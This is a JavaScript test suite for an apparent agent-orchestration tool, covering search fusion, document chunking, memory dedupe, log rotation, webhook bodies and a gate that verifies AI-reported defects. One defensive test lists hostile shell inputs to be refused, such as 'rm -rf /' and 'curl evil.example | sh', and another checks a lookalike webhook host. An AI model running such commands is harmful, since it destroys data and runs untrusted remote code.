  eq("  one first place outweighs being middling twice", fused[2].item.k, "b");
  eq("  returns every distinct item", fused.length, 3);
  // Appearing in BOTH lists must beat appearing 1st in only one.
  const only = rrfFuse([[{ k: "x" }], [{ k: "y" }, { k: "x" }]], id, { limit: 2 });
  eq("  two appearances beat one", only[0].item.k, "x");
  eq("  honours limit", rrfFuse([A, B], id, { limit: 1 }).length, 1);
  eq("  a single list is just that list", rrfFuse([A], id, { limit: 3 }).map((r) => r.item.k), ["a", "b", "c"]);
  eq("  tolerates empty and missing lists", rrfFuse([[], null], id, { limit: 3 }), []);
  eq("  skips items with no key", rrfFuse([[{ k: null }, { k: "a" }]], id, { limit: 3 }).map((r) => r.item.k), ["a"]);
}

console.log("# deliverableEmbedText — what a document is embedded as");
// The filename is real signal, so it leads — humanised, because an embedder reads "ci cd workflows"
// better than the raw slug.
chk("  filename leads, humanised and de-extensioned", deliverableEmbedText("ci-cd-workflows.md", "body").startsWith("ci cd workflows\n"));
chk("  underscores become spaces too", deliverableEmbedText("org_structure.md", "x").startsWith("org structure"));
chk("  includes the content", deliverableEmbedText("a.md", "hello world").includes("hello world"));
// nomic-embed-text tops out ~2048 tokens; a long doc is represented by its opening, not silently
// truncated mid-embedding by the server.
chk("  caps long content", deliverableEmbedText("a.md", "x".repeat(9000)).length < 4200);
eq("  no content → just the title", deliverableEmbedText("only-a-name.md", ""), "only a name");
eq("  tolerates nulls", deliverableEmbedText(null, null), "");

console.log("# chunkDocument — long documents split into embeddable passages");
{
  eq("  empty → no chunks", chunkDocument(""), []);
  eq("  tolerates null", chunkDocument(null), []);
  eq("  short text stays one chunk", chunkDocument("just a short note").length, 1);
  // A document under the limit must be untouched — chunking may not alter the common case.
  eq("  short text is returned verbatim", chunkDocument("just a short note")[0], "just a short note");

  // Heading-boundary splitting, with each chunk carrying its heading for context.
  const doc = ["# Alpha", "a".repeat(900), "", "# Beta", "b".repeat(900), "", "# Gamma", "c".repeat(900)].join("\n");
  const parts = chunkDocument(doc);
  chk("  splits a long doc at headings", parts.length >= 3);
  chk("  every chunk carries its heading", parts.every((p) => /^#\s+(Alpha|Beta|Gamma)/.test(p)));
  chk("  content is distributed, not duplicated wholesale", parts.some((p) => p.includes("aaa")) && parts.some((p) => p.includes("bbb")) && parts.some((p) => p.includes("ccc")));

  // A single oversized paragraph must still be split, with overlap so a seam can't swallow a sentence.
  const huge = chunkDocument("# Big\n" + "x".repeat(5000));
  chk("  slices an oversized paragraph", huge.length > 1);
  chk("  respects the size limit (heading allowance aside)", huge.every((p) => p.length <= 1400));
  chk("  overlaps hard slices", huge.length > 1 && huge[0].slice(-50) && huge[1].includes(huge[0].slice(-50)));

  // Cost bound: one pathological document cannot produce unbounded vectors.
  chk("  caps the chunk count", chunkDocument("y".repeat(200000)).length <= 24);
  // No chunk may be empty — an empty string embeds to nothing useful and would waste a row.
  chk("  never emits an empty chunk", chunkDocument(doc).every((p) => p.trim().length > 0));
}

console.log("# deliverableChunks — title on every passage, index is the row key");
{
  eq("  short doc → single chunk at index 0", deliverableChunks("org-structure.md", "who reports to whom").length, 1);
  chk("  title leads each chunk", deliverableChunks("org-structure.md", "who reports to whom")[0].text.startsWith("org structure"));
  const many = deliverableChunks("guide.md", ["# One", "a".repeat(900), "# Two", "b".repeat(900)].join("\n"));
  chk("  indexes are sequential from 0", many.every((c, i) => c.idx === i));
  chk("  every chunk keeps the document title", many.every((c) => c.text.startsWith("guide")));
  eq("  empty content still yields the title", deliverableChunks("only-name.md", "").length, 1);
  eq("  deliverableTitle humanises the filename", deliverableTitle("ci-cd_workflows.md"), "ci cd workflows");
}

console.log("# memory keys — stable identity for embedding rows");
eq("  uses agentId:at when a timestamp exists", memoryKey("ag1", { at: 1700000000000 }), "ag1:1700000000000");
chk("  falls back to a content hash with no timestamp", /^ag1:h[0-9a-f]{16}$/.test(memoryKey("ag1", { objective: "o", summary: "s" })));
eq("  same content → same fallback key", memoryKey("ag1", { objective: "o", summary: "s" }), memoryKey("ag1", { objective: "o", summary: "s" }));
chk("  different content → different fallback key", memoryKey("ag1", { objective: "o", summary: "s" }) !== memoryKey("ag1", { objective: "o", summary: "t" }));
eq("  memoryText joins objective and summary", memoryText({ objective: "Write docs", summary: "Did it" }), "Write docs\nDid it");
eq("  memoryText of an empty entry is empty", memoryText({}), "");

console.log("# duplicate collapsing — one task re-run must not eat every recall slot");
// Shapes taken from the real corpus: identical first line, divergent appended criteria / QA text.
const CRIT = "\n\nAcceptance criteria (the definition of done) — aim to satisfy all of these:\n1. Th";
const QA = "\n\nA QA verifier reviewed the work and these acceptance criteria are NOT yet met";
eq("  signature is the first line only", objectiveSignature("Write a note." + CRIT), "write a note");
eq("  same first line, different tail → same signature", objectiveSignature("Write a note." + CRIT), objectiveSignature("Write a note." + QA));
eq("  normalises case and punctuation", objectiveSignature("Write A Note!!"), "write a note");
eq("  collapses whitespace", objectiveSignature("Write   a    note"), "write a note");
eq("  empty in, empty out", objectiveSignature(""), "");
eq("  tolerates null", objectiveSignature(null), "");
chk("  different objectives keep different signatures", objectiveSignature("Write a note") !== objectiveSignature("Delete a note"));
{
  const runs = [
    { at: 3, objective: "Write a note." + CRIT, summary: "(stopped without a summary)" },
    { at: 2, objective: "Write a note." + QA, summary: "Saved drafts/note.md" },
    { at: 1, objective: "Write a note." + CRIT, summary: "(stopped without a summary)" },
    { at: 9, objective: "Ship the release." + CRIT, summary: "Shipped v2" },
  ];
  const out = dedupeMemories(runs);
  eq("  three attempts at one task collapse to one", out.length, 2);
  // The real-data trap: the NEWEST copy was a stopped re-run, so recency alone keeps the useless one.
  eq("  keeps the copy that actually has a summary, not just the newest", out.find((m) => /Write a note/.test(m.objective)).summary, "Saved drafts/note.md");
  chk("  keeps the genuinely distinct entry", out.some((m) => m.summary === "Shipped v2"));
  // Among equals, recency decides.
  const both = dedupeMemories([{ at: 1, objective: "X", summary: "older" }, { at: 5, objective: "X", summary: "newer" }]);
  eq("  with summaries on both, the newer wins", both[0].summary, "newer");
  // Never fuse things we can't identify.
  eq("  entries with no signature are never merged", dedupeMemories([{ objective: "" }, { objective: "" }]).length, 2);
  eq("  tolerates null and empty input", dedupeMemories(null).length, 0);
}

console.log("# startLogTee — the log a boot task leaves behind when nobody is watching");
{
  const dir = mkdtempSync(join(tmpdir(), "bureau-tee-"));
  const f = join(dir, "t.log");
  // Swap in no-op writes BEFORE starting the tee, so the tee captures THOSE as its passthrough and this
  // suite's output stays readable. The tee's own logic is exercised exactly as in production.
  const realOut = process.stdout.write.bind(process.stdout);
  const realErr = process.stderr.write.bind(process.stderr);
  process.stdout.write = () => true;
  process.stderr.write = () => true;
  const tee = startLogTee(f, 300, 3);              // 300-byte cap forces several rotations
  for (let i = 0; i < 30; i++) console.log(`l${i}-padpadpadpadpadpad`);
  process.stdout.write("no newline here");         // a chunk ending mid-line...
  process.stdout.write(" and the rest\n");         // ...completed by the next write
  console.error("stderr too");
  tee.stop();
  process.stdout.write = realOut;
  process.stderr.write = realErr;

  const files = readdirSync(dir).sort();
  const all = files.map((n) => readFileSync(join(dir, n), "utf8")).join("");
  eq("  rotates, keeping the live file plus keep=3 generations", files.length, 4);
  chk("  never keeps a generation beyond keep", !files.some((n) => /\.log\.[4-9]$/.test(n)));
  chk("  no file exceeds the size cap", files.every((n) => statSync(join(dir, n)).size <= 300));
  chk("  captures stderr, not just stdout", all.includes("stderr too"));
  chk("  every line carries a timestamp", all.split("\n").filter(Boolean).every((l) => /^\d{4}-\d\d-\d\dT/.test(l)));
  // The one that would silently corrupt a stack trace: stamping per WRITE rather than per LINE splices a
  // timestamp into the middle of any output that doesn't end in a newline.
  chk("  a write ending mid-line gets one stamp, not one per write",
    all.split("\n").some((l) => /^\S+Z no newline here and the rest$/.test(l)));
  chk("  stop() restores the real streams", process.stdout.write === realOut);
  rmSync(dir, { recursive: true, force: true });    // only possible because stop() closed the handle
  chk("  the temp dir is removable after stop() (no leaked handle)", !readdirSync(tmpdir()).includes(dir));
}
{
  // The actual reported bug, end to end: limit=2 used to come back as the same entry twice.
  const org = { agents: [{ id: "a1", name: "Ada", role: "Analyst", memory: [
    { at: 3, objective: "why checklists are useful" + CRIT, summary: "(stopped without a summary)" },
    { at: 2, objective: "why checklists are useful" + QA, summary: "wrote why-checklists.md" },
    { at: 1, objective: "why checklists are useful" + CRIT, summary: "(stopped without a summary)" },
    { at: 4, objective: "checklists in aviation safety", summary: "wrote aviation.md" },
  ] }] };
  const got = recallSharedMemory(org, "checklists", 2);
  eq("  recall returns two DISTINCT entries, not one repeated", new Set(got.map((r) => objectiveSignature(r.objective))).size, 2);
  chk("  and the surviving copy is the one with real content", got.some((r) => r.summary === "wrote why-checklists.md"));
}
{
  // Cross-agent identical work is two data points, not a duplicate — attribution is information.
  const org = { agents: [
    { id: "a1", name: "Ada", role: "Analyst", memory: [{ at: 1, objective: "audit the logs", summary: "found nothing" }] },
    { id: "a2", name: "Bo", role: "SRE", memory: [{ at: 2, objective: "audit the logs", summary: "found a leak" }] },
  ] };
  eq("  two agents doing the same task both keep a slot", recallSharedMemory(org, "audit logs", 4).length, 2);
}

console.log("# hybrid recall — vectors fused with BM25, degrading safely");
{
  const org = { agents: [
    { id: "a1", name: "Ada", role: "Analyst", memory: [{ at: 1, objective: "quarterly revenue analysis", summary: "built the revenue model" }] },
    { id: "a2", name: "Bo", role: "Writer", memory: [{ at: 2, objective: "customer onboarding email", summary: "drafted welcome copy" }] },
  ] };
  const lexOnly = recallSharedMemory(org, "revenue analysis", 2);
  eq("  BM25 path unchanged when no hybrid arg is passed", lexOnly[0].agentName, "Ada");
  // A query vector that points at Bo's entry should be able to surface it even though the QUERY
  // shares no keywords with it — this is the whole point of the semantic half.
  const vecs = new Map([["a1:1", new Float32Array([1, 0])], ["a2:2", new Float32Array([0, 1])]]);
  const semantic = recallSharedMemory(org, "revenue analysis", 2, "", { queryVec: [0, 1], vecOf: (it) => vecs.get(it._key) });
  chk("  a query vector pulls in a lexically-unrelated entry", semantic.some((r) => r.agentName === "Bo"));
  // Every degradation path must land back on pure BM25 rather than returning nothing.
  eq("  empty query vector → lexical", recallSharedMemory(org, "revenue analysis", 2, "", { queryVec: [], vecOf: () => null })[0].agentName, "Ada");
  eq("  no vecOf → lexical", recallSharedMemory(org, "revenue analysis", 2, "", { queryVec: [0, 1] })[0].agentName, "Ada");
  eq("  vectors all missing → lexical", recallSharedMemory(org, "revenue analysis", 2, "", { queryVec: [0, 1], vecOf: () => undefined })[0].agentName, "Ada");
  eq("  excludeAgentId still drops the asker", recallSharedMemory(org, "revenue analysis", 2, "a1").filter((r) => r.agentName === "Ada").length, 0);
}

console.log("# webhookBody — Discord/Slack reject bare JSON, so the body is shaped per destination");
{
  const failed = { objective: "Ship the quarterly report", agent: "Ada", error: "model unreachable", tokens: 1234 };

  // Discord 400s on a body with no `content`/`embeds`. This is the whole reason the function exists.
  const d = webhookBody("https://discord.com/api/webhooks/123/abc", "run_failed", failed);
  eq("  discord: wraps in content", Object.keys(d), ["content"]);
  chk("  discord: names the event", d.content.startsWith("[Bureau] run_failed"));
  chk("  discord: the REASON comes before the objective (a truncated phone alert still says why)",
    d.content.indexOf("error:") < d.content.indexOf("objective:"));

  const s = webhookBody("https://hooks.slack.com/services/T/B/x", "run_failed", failed);
  eq("  slack: wraps in text", Object.keys(s), ["text"]);
  chk("  slack: same one-liner", s.text.startsWith("[Bureau] run_failed"));

  // Backwards compatibility is the risk here: an existing generic consumer must see exactly what it saw
  // before. Pinning `now` keeps the comparison exact.
  eq("  other hosts: untouched generic JSON",
    webhookBody("https://example.com/hook", "run_done", { objective: "x", verdict: "pass" }, 99),
    { event: "run_done", at: 99, objective: "x", verdict: "pass" });
  eq("  an unparseable url falls back to generic rather than throwing",
    webhookBody("not-a-url", "run_done", { verdict: "pass" }, 99),
    { event: "run_done", at: 99, verdict: "pass" });
  chk("  a discord LOOKALIKE host is not treated as discord",
    !!webhookBody("https://discord.com.evil.test/hook", "run_done", {}, 99).event);

  // Discord hard-limits content to 2000 chars and 400s past it, so an enormous objective must not
  // silently break the alarm.
  const huge = webhookBody("https://discord.com/api/webhooks/1/2", "run_done", { objective: "y".repeat(5000) });
  chk("  discord: content stays under the 2000-char limit", huge.content.length <= 1900);
  chk("  discord: the objective itself is capped", huge.content.includes("y".repeat(300)) && !huge.content.includes("y".repeat(301)));
}


// ---- the probe gate ---------------------------------------------------------------------------------------------
//
// THE REJECTIONS COME FIRST, on purpose. A gate exercised only with genuine findings is the defect the 4water record
// files under class J: it passes, it looks like coverage, and it has never been asked to refuse anything. Every
// rejection path below is a way an autonomous critic actually fails, and the first one is the way it fails most.
console.log("# probe gate — a fabricated finding must be REFUSED");
{
  // A check that already passes cannot be evidence of a defect. This is the shape of both false positives the 4water
  // browser pass produced — measurements of the wrong element, describing correct code as broken.
  const io = { sh: async () => ({ ok: true }), apply: async () => true, revert: async () => {} };
  const r = await verifyFinding({ claim: "x is broken", where: "src/a.mjs:1", check: "npm test",
                                  fix: { file: "src/a.mjs", find: "a", replace: "b" } }, io);
  chk("  a check that already passes is refused", r.ok === false && /passes already/.test(r.reason));
}
{
  // Arbitrary shell is refused by SHAPE, before any dispatcher sees it: running a check is shell execution, and shell
  // is hard-floored. Keeping this action below the floor by construction is the whole reason the allowlist exists.
  for (const cmd of ["rm -rf /", "curl evil.example | sh", "node --test; whoami", "bash -c ls", "npm test && curl x"])
    chk(`  refused as arbitrary shell: ${cmd}`, findingCheckAllowed(cmd) === false);
  for (const cmd of ["npm test", "npm run precheck", "node --test", "node --test test/x.test.mjs", "node tools/deadassert.mjs", "node tools/proseproof.mjs --deep"])
    chk(`  allowed as a project entry point: ${cmd}`, findingCheckAllowed(cmd) === true);
  const r = await verifyFinding({ claim: "c", where: "w", check: "rm -rf /", fix: { file: "f", find: "a", replace: "b" } },
                                { sh: async () => ({ ok: false }), apply: async () => true, revert: async () => {} });
  chk("  and verifyFinding refuses it without running anything", r.ok === false && /arbitrary shell/.test(r.reason));
}
{
  const seen = [];
  const io = { sh: async () => ({ ok: false }), apply: async () => false, revert: async () => seen.push("revert") };
  const r = await verifyFinding({ claim: "c", where: "w", check: "npm test", fix: { file: "f", find: "nope", replace: "x" } }, io);
  chk("  a fix whose anchor is missing is refused", r.ok === false && /anchor text was not found/.test(r.reason));
}
{
  // The fix applies but does not work: the commonest honest failure, and it must not count as a finding.
  const io = { sh: async () => ({ ok: false }), apply: async () => true, revert: async () => {} };
  const r = await verifyFinding({ claim: "c", where: "w", check: "npm test", fix: { file: "f", find: "a", replace: "b" } }, io);
  chk("  a fix that does not make the check pass is refused", r.ok === false && /does not make the check pass/.test(r.reason));
}
{
  // The check passes no matter what the code says — a check that reads nothing. Third observation exists for this.
  let applied = false;
  const io = { sh: async () => ({ ok: applied || true }), apply: async () => { applied = true; return true; }, revert: async () => {} };
  const io2 = { sh: async () => ({ ok: io2._n++ > 0 }), apply: async () => true, revert: async () => {}, _n: 0 };
  const r = await verifyFinding({ claim: "c", where: "w", check: "npm test", fix: { file: "f", find: "a", replace: "b" } }, io2);
  chk("  a check that passes with the fix reverted is refused", r.ok === false && /not reading the code/.test(r.reason));
}
{
  // A gate that throws must not read as a pass, and it must still try to revert — cleanup on the happy path only is
  // how tools/proseproof.mjs leaked a git worktree on every run.
  let reverted = false;
  const io = { sh: async () => { throw new Error("suite hung"); }, apply: async () => true, revert: async () => { reverted = true; } };
  const r = await verifyFinding({ claim: "c", where: "w", check: "npm test", fix: { file: "f", find: "a", replace: "b" } }, io);
  chk("  a throw is a refusal, not a pass", r.ok === false && /verification itself failed/.test(r.reason));
  chk("  and the fix is reverted anyway", reverted === true);
}
console.log("# probe gate — a real finding is CONFIRMED, with the three observations recorded");
{
  // fails, then passes with the fix, then fails again when reverted.
  let fixed = false;
  const io = { sh: async () => ({ ok: fixed }), apply: async () => { fixed = true; return true; },
               revert: async () => { fixed = false; } };
  const r = await verifyFinding({ claim: "the form offers past dates", cls: "E", where: "src/pages/a.mjs:31",
                                  check: "node --test test/bulk.test.mjs",
                                  fix: { file: "src/pages/a.mjs", find: "WHERE x", replace: "WHERE x AND d >= :from" } }, io);
  chk("  confirmed", r.ok === true);
  eq("  all three observations recorded", r.obs, { before: false, after: true, again: false });
  chk("  the class is carried", r.finding?.cls === "E");
}
console.log("# probe gate — shape validation");
{
  const bad = [[{}, /needs a claim/], [{ claim: "c" }, /needs a location/], [{ claim: "c", where: "w" }, /needs a check/],
               [{ claim: "c", where: "w", check: "npm test" }, /needs a fix/],
               [{ claim: "c", where: "w", check: "npm test", fix: { file: "f", find: "a", replace: "a" } }, /changes nothing/]];
  for (const [body, re] of bad) {
    const r = normalizeFinding(body);
    chk(`  refused: ${re.source}`, r.ok === false && re.test(r.reason));
  }
}
console.log("# normalizeAction — register_finding and its aliases");
for (const at of ["register_finding", "finding", "report_finding", "defect", "report_defect", "bug", "log_finding"])
  eq(`  ${at} -> register_finding`, normalizeAction({ actionType: at, title: "t", command: "npm test" }).actionType, "register_finding");


// ---- the investigate phase --------------------------------------------------------------------------------------
//
// The exit condition IS the feature. A loop that stops when the criteria are met is what Bureau already had; a loop
// that stops when consecutive rounds find nothing new is the thing the 4water benchmark says produces the quality.
// So the tests are about when it stops, and about what makes it keep going.
console.log("# investigate — the loop stops on EXHAUSTION, not on satisfaction");
{
  const mkRun = () => ({ events: [], listeners: new Set(), findings: [], rejectedFindings: [], rounds: [] });
  {
    // Nothing found, ever: two dry rounds and out. Not eight.
    const run = mkRun();
    let calls = 0;
    await investigate(run, async () => { calls++; return { tokens: 1 }; }, { dryLimit: 2 });
    eq("  a barren codebase costs two rounds", [calls, run.rounds.length], [2, 2]);
    chk("  and reports why it stopped", run.events.some((e) => e.type === "investigated" && e.data?.stoppedBecause === "dry"));
  }
  {
    // A find resets the counter — a productive lens must not be cut off by an earlier dry round.
    const run = mkRun();
    let n = 0;
    await investigate(run, async () => { n++; if (n === 2) run.findings.push({ claim: "x", cls: "B" }); return { tokens: 1 }; }, { dryLimit: 2 });
    chk("  a find resets the dry counter, so it keeps going", run.rounds.length >= 4);
    eq("  and the round that found something records it", run.rounds[1].confirmed, 1);
    eq("  while the barren ones record zero", [run.rounds[0].confirmed, run.rounds[2].confirmed], [0, 0]);
  }
  {
    // A stream of REFUSED claims must not keep the loop alive: only confirmed findings reset the counter, or an
    // over-confident critic bills forever while producing nothing.
    const run = mkRun();
    await investigate(run, async () => { run.rejectedFindings.push({ claim: "guess", reason: "passes already" }); return { tokens: 1 }; }, { dryLimit: 2 });
    eq("  refused claims do not count as progress", run.rounds.length, 2);
  }
  {
    // The round cap is a real ceiling on a lens that keeps finding things.
    const run = mkRun();
    await investigate(run, async () => { run.findings.push({ claim: "another", cls: "E" }); return { tokens: 1 }; }, { dryLimit: 2, maxRounds: 3 });
    eq("  a productive loop still stops at the round cap", run.rounds.length, 3);
    chk("  and says that is why", run.events.some((e) => e.type === "investigated" && e.data?.stoppedBecause === "round cap"));
  }
  {
    // Stopping the run stops the loop.
    const run = mkRun();
    await investigate(run, async () => { run.stopped = true; return { tokens: 1 }; }, { dryLimit: 2 });
    eq("  a stopped run ends the loop after the round in flight", run.rounds.length, 1);
  }
  {
    const run = mkRun();
    const t = await investigate(run, async () => ({ tokens: 7 }), { dryLimit: 2 });
    eq("  tokens are returned so the run books them", t, 14);
  }
}
console.log("# investigate — lens rotation is informed, not random");
{
  chk("  every lens is an instruction, not a topic", LENSES.every((l) => l.prompt.length > 60 && /\b(Read|Take|Find|Walk|Run|For each)\b/.test(l.prompt)));
  chk("  every lens has a distinct id", new Set(LENSES.map((l) => l.id)).size === LENSES.length);
  {
    const run = { rounds: [] };
    const first = pickLens(run);
    run.rounds.push({ lens: first.id, confirmed: 0 });
    chk("  an unproductive lens is not repeated immediately", pickLens(run).id !== first.id);
  }
  {
    const run = { rounds: [{ lens: LENSES[0].id, confirmed: 1 }] };
    eq("  a lens that just found something gets another turn", pickLens(run).id, LENSES[0].id);
  }
  {
    // Two dry rounds retires a lens — the register's whole purpose.
    const run = { rounds: [{ lens: LENSES[0].id, confirmed: 0 }, { lens: LENSES[0].id, confirmed: 0 }] };
    chk("  two dry rounds retire a lens", pickLens(run).id !== LENSES[0].id);
    const allDry = { rounds: LENSES.flatMap((l) => [{ lens: l.id, confirmed: 0 }, { lens: l.id, confirmed: 0 }]) };
    chk("  and when every lens is retired it still returns one rather than crashing", !!pickLens(allDry));
  }
}
console.log("# investigate — the round prompt carries what the agent needs and nothing it should repeat");
{
  const run = { findings: [{ claim: "the export omits notes" }], rejectedFindings: [{ claim: "a hunch", reason: "the check passes already" }] };
  const o = investigateObjective(run, LENSES[0], { E: { count: 9 }, B: { count: 4 } });
  chk("  it says the criteria passing is not the same as being right", /passed its acceptance criteria/.test(o));
  chk("  it carries the lens instruction verbatim", o.includes(LENSES[0].prompt));
  chk("  it lists the confirmed finding so it is not re-found", /CONFIRMED: the export omits notes/.test(o));
  chk("  it lists the REFUSED claim with its reason, so it is not resubmitted", /ALREADY REFUSED \(the check passes already\): a hunch/.test(o));
  chk("  it ranks the company's known classes, commonest first", /E x9, B x4/.test(o));
  chk("  and it invites an honest empty round", /honest empty round/.test(o));
  const bare = investigateObjective({ findings: [], rejectedFindings: [] }, LENSES[1], {});
  chk("  with no history it says nothing about repeats", !/Do NOT repeat/.test(bare));
}


console.log("# investigate — the company round cap is honoured");
{
  const run = { events: [], listeners: new Set(), findings: [], rejectedFindings: [], rounds: [] };
  // maxRounds comes from guardrails.investigateRounds; the hook passes `Number(x) || undefined` so 0 means "default".
  await investigate(run, async () => ({ tokens: 1 }), { dryLimit: 9, maxRounds: 3 });
  eq("  a cap of 3 stops after 3 rounds even with a high dry limit", run.rounds.length, 3);
  const run2 = { events: [], listeners: new Set(), findings: [], rejectedFindings: [], rounds: [] };
  await investigate(run2, async () => ({ tokens: 1 }), { dryLimit: 9, maxRounds: Number(0) || undefined });
  eq("  a cap of 0 falls back to the built-in maximum, not to zero rounds", run2.rounds.length, 8);
}

console.log(`\n${fail === 0 ? "ALL PASS ✓" : "FAILURES ✗"} — ${pass} passed, ${fail} failed`);

process.exit(fail === 0 ? 0 : 1);
